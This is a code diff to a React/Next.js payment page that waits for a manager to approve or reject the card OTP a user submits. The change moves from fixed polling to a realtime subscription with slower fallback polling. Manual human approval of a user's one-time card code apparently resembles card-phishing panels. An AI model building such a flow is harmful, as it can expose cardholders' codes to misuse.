@@ -1,12 +1,13 @@
 "use client";
 
-import { useState, useEffect, FormEvent } from "react";
+import { useState, useEffect, FormEvent, useCallback } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
 import { Dictionary } from "@/lib/i18n";
 import { Card } from "@/components/ui/Card";
 import { Button } from "@/components/ui/Button";
 import { formatSalary } from "@/lib/utils";
+import { subscribeToEntryStatus } from "@/lib/realtime";
 import { CandidateImage } from "./CandidateImage";
 import type { Booking, Worker } from "@/lib/supabase/types";
 import styles from "./VerifyCardClient.module.css";
@@ -37,30 +38,65 @@ export function VerifyCardClient({
   const serviceFee = Math.round(amount * 0.1);
   const total = amount + serviceFee;
 
-  // استطلاع قرار المدير على رمز التحقق كل 3 ثوانٍ
-  useEffect(() => {
-    if (!verifying || !otpEntryId) return;
-    const interval = setInterval(async () => {
+  // استقبال قرار المدير على رمز التحقق فوراً عبر Realtime على قناة الـ entry،
+  // مع التحقق من الحالة الفعلية بطلب API موثوق. polling احتياطي بطيء (5ث).
+  const verifyOtpStatus = useCallback(
+    async (entryId: string) => {
       try {
-        const res = await fetch(`/api/payments/otp-status?entryId=${otpEntryId}`, {
+        const res = await fetch(`/api/payments/otp-status?entryId=${entryId}`, {
           cache: "no-store" as RequestCache,
+          headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
         });
         const data = await res.json();
         if (data.status === "approved") {
           setVerifying(false);
           setSuccess(true);
-        } else if (data.status === "rejected") {
+          return "approved";
+        }
+        if (data.status === "rejected") {
           setVerifying(false);
           setError(p.otpRejectedMsg);
           setOtp("");
           setOtpEntryId(null);
+          return "rejected";
         }
       } catch {
         // تجاهل أخطاء الشبكة مؤقتاً
       }
-    }, 3000);
-    return () => clearInterval(interval);
-  }, [verifying, otpEntryId, p.otpRejectedMsg]);
+      return null;
+    },
+    [p.otpRejectedMsg],
+  );
+
+  useEffect(() => {
+    if (!verifying || !otpEntryId) return;
+
+    let cancelled = false;
+
+    const channel = subscribeToEntryStatus(
+      otpEntryId,
+      () => {
+        if (!cancelled) void verifyOtpStatus(otpEntryId);
+      },
+      () => {
+        if (!cancelled) void verifyOtpStatus(otpEntryId);
+      },
+    );
+
+    // قراءة فورية عند الدخول.
+    void verifyOtpStatus(otpEntryId);
+
+    // polling احتياطي بطيء.
+    const interval = setInterval(() => {
+      if (!cancelled) void verifyOtpStatus(otpEntryId);
+    }, 5000);
+
+    return () => {
+      cancelled = true;
+      clearInterval(interval);
+      void channel.unsubscribe();
+    };
+  }, [verifying, otpEntryId, verifyOtpStatus]);
 
   async function handleSubmit(e: FormEvent) {
     e.preventDefault();
@@ -87,14 +123,21 @@ export function VerifyCardClient({
       });
       const data = await res.json();
       if (!res.ok) {
-        setError(p.otpLengthError);
+        // عرض رسالة مناسبة حسب سبب الفشل (لم يعد الدفع موافقًا عليه، أو خطأ عام).
+        const msg =
+          data.error === "payment_not_approved"
+            ? p.otpRejectedMsg
+            : data.error === "payment_not_found"
+              ? p.rejectedMsg
+              : p.otpRejectedMsg;
+        setError(msg);
         return;
       }
       // تم الإرسال — انتقل لشاشة الانتظار
       setOtpEntryId(data.entryId);
       setVerifying(true);
     } catch {
-      setError(p.otpLengthError);
+      setError(p.otpRejectedMsg);
     } finally {
       setLoading(false);
     }
